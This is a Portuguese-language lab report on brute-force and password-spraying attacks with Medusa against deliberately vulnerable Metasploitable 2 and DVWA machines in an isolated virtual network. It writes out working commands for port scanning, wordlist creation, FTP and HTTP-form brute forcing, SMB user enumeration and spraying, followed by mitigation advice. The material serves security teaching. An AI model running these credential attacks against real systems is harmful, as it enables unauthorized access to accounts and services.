Relatório Técnico – Simulação de Ataques de Força Bruta Utilizando Medusa em Ambientes Vulneráveis (Kali Linux, Metasploitable 2 e DVWA)
1. Introdução

O presente relatório descreve a implementação de um ambiente controlado para fins educacionais e experimentação em segurança da informação, com foco na execução de ataques de 
força bruta utilizando a ferramenta Medusa. O objetivo da atividade é compreender, na prática, como ocorrem tentativas de autenticação indevida em serviços vulneráveis e, 
posteriormente, propor medidas de mitigação para prevenir tais ataques em ambientes reais.

Para isso, foram utilizadas duas máquinas virtuais:

Kali Linux: distribuição Linux focada em testes de intrusão e auditoria.

Metasploitable 2: máquina propositalmente vulnerável, ideal para testes de segurança.

Ambas foram configuradas no VirtualBox, em rede “host-only”, garantindo isolamento e segurança durante os testes.

2. Configuração do Ambiente de Testes
2.1 Criação das Máquinas Virtuais

Foram instaladas e configuradas duas VMs no VirtualBox:

Kali Linux

Metasploitable 2

A comunicação entre ambas foi estabelecida via rede interna (host-only).

2.2 Snapshot de Segurança

Antes do início dos testes, foi criado um snapshot no VirtualBox, permitindo retornar ao estado original da VM caso algum procedimento comprometesse o ambiente.

3. Verificação de Conectividade e Mapeamento de Serviços
3.1 Teste de comunicação entre as máquinas
ping -c 3 192.168.56.40


O comando confirmou que as VMs estavam se comunicando corretamente.

3.2 Varredura de portas com Nmap
nmap -sV -p 21,22,80,445,139 192.168.56.40


Esse comando identificou:

Portas abertas,

Versões de serviços,

Protocolos associados.

Com isso, foi possível confirmar que o serviço FTP (porta 21) estava ativo, permitindo iniciar ataques de força bruta.

4. Ataque de Força Bruta ao Serviço FTP com Medusa
4.1 Tentativa inicial de autenticação
ftp 192.168.56.40


Como as credenciais eram desconhecidas, foi necessário gerar listas de usuários e senhas.

4.2 Criação de wordlists simples
echo -e "user\nmsfadmin\nadmin\nroot" > usuarios.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > senhas.txt

4.3 Execução do ataque de força bruta
medusa -h 192.168.56.40 -U usuarios.txt -P senhas.txt -M ftp -t 6


Ao final, o Medusa retornou credenciais válidas, permitindo a autenticação no FTP.

4.4 Login após obtenção das credenciais
ftp 192.168.56.40

5. Teste em Aplicação Web Vulnerável – DVWA

Acesso ao DVWA:

192.168.56.102/dvwa/login.php


Com o F12, foi possível inspecionar o tráfego HTTP na aba Network, observando requisições e parâmetros enviados.

Tentativas manuais com:

usuário: admin

senha: admin

resultaram em falha, conforme resposta observada em Request.

5.1 Wordlists

Foram reutilizados os arquivos criados anteriormente:

echo -e "user\nmsfadmin\nadmin\nroot" > usuarios.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > senhas.txt

5.2 Ataque web com Medusa
medusa -h 192.168.56.40 -U usuarios.txt -P senhas.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m FAIL='Login failed' -t 6


O resultado identificou usuário e senha válidos, possibilitando login no DVWA.

6. Password Spraying Contra Serviço SMB
6.1 Enumeração de Usuários com Enum4linux

Instalação e execução:

enum4linux -a 192.168.56.40 | tee enum4_output.txt


Exibição dos resultados:

less enum4_output.txt


A partir disso, foi possível identificar usuários válidos do sistema.

6.2 Criação de Wordlists específicas

Usuários:

echo -e "user\nmsfadmin\nservice" > smb_users.txt


Senhas (password spraying):

echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

6.3 Execução do ataque
medusa -h 192.168.56.40 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50


O Medusa indicou:

account found para credenciais válidas,

account check para tentativas sem sucesso.

6.4 Teste de acesso com SMBClient
smbclient -L //192.168.56.40 -U msfadmin


A autenticação foi bem-sucedida, confirmando a quebra de credenciais.

7. Considerações e Recomendações de Mitigação

Os testes demonstram que senhas fracas continuam sendo uma das principais vulnerabilidades exploradas por atacantes. Para ambientes reais, recomenda-se:

7.1 Fortalecimento de Senhas

Utilização de senhas complexas,

Troca periódica,

Bloqueio após tentativas incorretas,

Políticas de expiração e gerenciamento seguro.

7.2 Redução da Superfície de Ataque

Desativar serviços desnecessários,

Atualização constante de protocolos e sistemas,

Limitação de tentativas por IP,

Captchas em formulários de autenticação.

7.3 Adoção de Autenticação Multifator (MFA)

A MFA reduz drasticamente o sucesso de ataques de força bruta.

7.4 Monitoramento e Logs

Monitoramento de tentativas de login,

Alertas automáticos,

Correlacionamento de eventos por ferramentas SIEM.

8. Conclusão

Este experimento prático permitiu observar como ataques de força bruta, password spraying e enumeração de usuários são facilmente automatizados com a ferramenta Medusa, 
especialmente quando os serviços utilizam credenciais fracas ou padrões inseguros. Além disso, demonstrou a importância de um ambiente devidamente configurado e protegido, 
bem como da implementação de políticas de segurança adequadas.

A prática reforça a necessidade de medidas preventivas, atualizações contínuas e conscientização dos usuários para mitigação de falhas exploradas em ambientes reais.
